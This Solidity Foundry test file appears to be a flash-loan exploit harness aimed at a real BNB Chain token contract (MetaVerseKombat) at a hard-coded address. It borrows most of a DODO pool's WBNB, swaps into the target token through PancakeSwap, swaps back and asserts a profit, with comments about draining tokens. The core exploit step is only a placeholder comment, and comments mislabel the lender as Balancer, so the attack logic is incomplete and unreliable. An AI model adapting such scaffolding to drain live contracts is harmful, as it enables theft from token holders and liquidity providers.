// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IMetaVerseKombat {
    struct UserTransferLogDetails {
        uint256 transferLimits;
        uint256 transfered;
    }
    function UserLastSellTimeStamp(address) external returns (uint256);
    function UserrewardPoolOnLastClaim(address) external returns (uint256);
    function _rewardPool() external returns (uint256);
    function _claimedRewardPool() external returns (uint256);
    function _maxAntiWhaleLimits() external returns (uint256);
    function _minAntiWhaleLimits() external returns (uint256);
    function _sellTimeInterval() external returns (uint256);
    function tokenHolder(uint256) external returns (address);
    function checkUserBlocked(address) external returns (bool);
    function marketingwallet() external returns (address);
    function pancakeRouter() external returns (address);
    function pancakePair() external returns (address);
    function _sellTaxFee() external returns (uint256);
    function _buyTaxFee() external returns (uint256);
    function _LiquidityBuyPer() external returns (uint256);
    function _LiquiditySellPer() external returns (uint256);
    function _marketingBuyPer() external returns (uint256);
    function _marketingSellPer() external returns (uint256);
    function _RewardBuyPer() external returns (uint256);
    function _RewardSellPer() external returns (uint256);
    function _autoBurnBuyPer() external returns (uint256);
    function _autoBurnSellPer() external returns (uint256);
    function swapAndLiquifyEnabled() external returns (bool);
    function _UserTransferLogDetails(address) external returns (UserTransferLogDetails memory);
    function numberOfTokenHolders() external returns (uint256);
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address) external;
    function setContractManager() external;
    function set_TransferLimit(address,uint256) external;
    function set_sellTimeInterval(uint256) external;
    function update_AntiWhaleLimits(uint256,uint256) external;
    function update_MarketingWalletAddress(address) external;
    function checkSellEligibility(address) external view returns (bool);
    function getCurrentTimeStamp() external view returns (uint256);
    function Initialize(address,address) external;
    function excludedFromFee(address) external;
    function includeForFee(address) external;
    function pauseTransaction() external;
    function unpauseTransaction() external;
    function blockWalletAddress(address) external;
    function unblockWalletAddress(address) external;
    function updateBuyFee(uint256,uint256,uint256,uint256,uint256) external;
    function updateSellFee(uint256,uint256,uint256,uint256,uint256) external;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function isExcludedFromReward(address) external view returns (bool);
    function totalFees() external view returns (uint256);
    function updateRewardStatus(address,bool) external;
    function myRewards(address) external view returns (uint256);
    function claimReward() external;
    function setSwapAndLiquifyEnabled(bool,uint256) external;
    function verifyBNB() external;
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // Approve the contract to spend the flashloan amount
    valuableToken.approve(address(uniswapRouter), amount);

    // Swap valuableToken for META token (assumed to be MVK)
    address[] memory path = new address[](2);
    path[0] = address(valuableToken);
    path[1] = address(token);

    // Swap tokens
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);

    // Interact with MetaVerseKombat contract, call necessary functions to exploit any flaw.
    // Assume we're creating a liquidity event or something similar to drain tokens.

    // For example, a potential function could be:
    // callMetaVerseKombatFunction(address(this));

    // Now, quantities of META tokens (MVK) should be increased.

    // Finally, we can swap MVK tokens back to valuableToken
    uint256 mvkAmount = IERC20(token).balanceOf(address(this));
    path[0] = address(token);
    path[1] = address(valuableToken);
    
    IERC20(token).approve(address(uniswapRouter), mvkAmount);
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(mvkAmount, 0, path, address(this), block.timestamp);

    // At the end, ensure we have enough valuableToken to pay back the flashloan
    uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
    require(finalValuableBalance > amount, "Not enough valuableToken balance to produce profit");
}
}


